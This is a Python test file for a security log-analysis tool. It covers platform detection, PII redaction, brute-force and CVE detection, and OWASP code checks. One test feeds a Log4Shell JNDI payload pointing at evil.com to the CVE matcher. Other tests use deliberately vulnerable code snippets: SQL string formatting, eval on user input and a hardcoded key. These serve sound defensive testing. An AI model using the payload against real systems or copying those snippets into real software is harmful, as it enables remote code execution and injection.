"""
tests/test_all.py
Run: PYTHONPATH=. pytest tests/test_all.py -v
"""
import asyncio, pytest, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from analysis.platform.detector import detect_platform, detect_distro, detect_log_format
from analysis.log_parser.pii_redactor import redact_pii
from analysis.log_parser.severity_tagger import tag_severity
from analysis.security_agent.brute_force import detect_brute_force
from analysis.security_agent.cve_matcher import match_cves
from analysis.ast_engine.pass3_owasp import run_owasp_pass
from analysis.models.analysis_models import LogEvent

run = lambda coro: asyncio.get_event_loop().run_until_complete(coro)


class TestPlatformDetector:
    def test_linux(self):
        assert detect_platform("sshd[1]: Failed password for root") == "linux"

    def test_windows(self):
        assert detect_platform("EventID: 4625\nLog Name: Security\nSource: Microsoft-Windows") == "windows"

    def test_macos(self):
        assert detect_platform("com.apple.xpc.launchd: service crashed") == "macos"

    def test_ubuntu_distro(self):
        assert detect_distro("apt-get install nginx Ubuntu", "linux") == "ubuntu"

    def test_arch_distro(self):
        assert detect_distro("Arch Linux pacman -S nginx", "linux") == "arch"

    def test_rhel_distro(self):
        assert detect_distro("yum update Red Hat", "linux") == "rhel"

    def test_syslog_format(self):
        log = "May 13 02:14:03 server sshd[1234]: Failed password for root"
        assert detect_log_format(log, "linux") in ("syslog", "auth")

    def test_dmesg_format(self):
        assert detect_log_format("[    0.123456] Linux version 5.15", "linux") == "dmesg"

    def test_winevt_format(self):
        log = "<Event xmlns='http://schemas.microsoft.com'><EventID>4625</EventID></Event>"
        assert detect_log_format(log, "windows") == "winevt"


class TestPiiRedactor:
    def test_ipv4(self):
        r = redact_pii("Failed login from 192.168.1.100")
        assert "192.168.1.100" not in r and "[IP_REDACTED]" in r

    def test_email(self):
        r = redact_pii("User admin@example.com logged in")
        assert "admin@example.com" not in r and "[EMAIL_REDACTED]" in r

    def test_linux_home(self):
        r = redact_pii("Config at /home/johndoe/.ssh/authorized_keys")
        assert "johndoe" not in r

    def test_windows_sid(self):
        r = redact_pii("SID: S-1-5-21-3623811015-3361044348-30300820")
        assert "S-1-5-21" not in r and "[SID_REDACTED]" in r

    def test_macos_user_path(self):
        r = redact_pii("Library at /Users/alice/Library/Preferences")
        assert "alice" not in r

    def test_non_pii_unchanged(self):
        text = "nginx: worker process started"
        assert redact_pii(text) == text


class TestSeverityTagger:
    def test_critical_oom(self):
        assert tag_severity("Out of memory: Kill process 999") == "CRITICAL"

    def test_critical_kernel_panic(self):
        assert tag_severity("kernel panic — not syncing") == "CRITICAL"

    def test_warning_failed(self):
        assert tag_severity("Failed password for root") == "WARNING"

    def test_info_default(self):
        assert tag_severity("nginx: worker process started") == "INFO"


class TestBruteForce:
    def _events(self, raw_lines):
        return [LogEvent(raw=l, message=l, platform="linux") for l in raw_lines]

    def test_ssh_detected(self):
        events = self._events(["Failed password for root from 1.2.3.4 port 22"] * 6)
        result = detect_brute_force(events)
        assert result is not None
        assert result["severity"] == "CRITICAL"
        assert "SSH" in result["message"]

    def test_ssh_below_threshold(self):
        # Bug 3 fix: threshold=5, so 4 should NOT trigger
        events = self._events(["Failed password for root from 1.2.3.4"] * 4)
        assert detect_brute_force(events) is None

    def test_rdp_detected(self):
        events = self._events(["EventID: 4625 Logon Type: 3"] * 6)
        result = detect_brute_force(events)
        assert result is not None and "RDP" in result["message"]

    def test_no_attack(self):
        events = self._events(["nginx started", "disk usage 45%", "cron job ran"])
        assert detect_brute_force(events) is None

    def test_source_ip_in_finding(self):
        # Bug 4 fix: source_ip must be in finding dict
        events = self._events(["Failed password for root from 10.0.0.5 port 22"] * 6)
        result = detect_brute_force(events)
        assert "source_ip" in result
        assert result["source_ip"] == "10.0.0.5"


class TestCveMatcher:
    def test_log4shell(self):
        hits = match_cves("${jndi:ldap://evil.com/exploit}", "linux")
        assert any("Log4Shell" in h["message"] for h in hits)

    def test_printnightmare(self):
        hits = match_cves("spoolsv.exe PrintNightmare crash", "windows")
        assert any("PrintNightmare" in h["message"] for h in hits)

    def test_no_match(self):
        assert match_cves("nginx started successfully", "linux") == []

    def test_platform_filter(self):
        # PrintNightmare is Windows-only, should not match linux
        hits = match_cves("spoolsv PrintNightmare", "linux")
        assert not any("PrintNightmare" in h["message"] for h in hits)


class TestOwaspPass3:
    def test_sql_injection(self):
        code = 'cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)'
        issues = run(run_owasp_pass(code, "python"))
        assert any("SQL" in i.message for i in issues)
        assert any(i.cwe_id == "CWE-89" for i in issues)

    def test_hardcoded_secret(self):
        code = 'api_key = "supersecretkey123"'
        issues = run(run_owasp_pass(code, "python"))
        assert any("Hardcoded" in i.message for i in issues)

    def test_eval_detected(self):
        # Bug 5 fix: eval must be in OWASP rules now
        code = "result = eval(user_input)"
        issues = run(run_owasp_pass(code, "python"))
        assert any("eval" in i.message.lower() for i in issues)

    def test_clean_code(self):
        code = "def add(a, b):\n    return a + b"
        issues = run(run_owasp_pass(code, "python"))
        assert len(issues) == 0
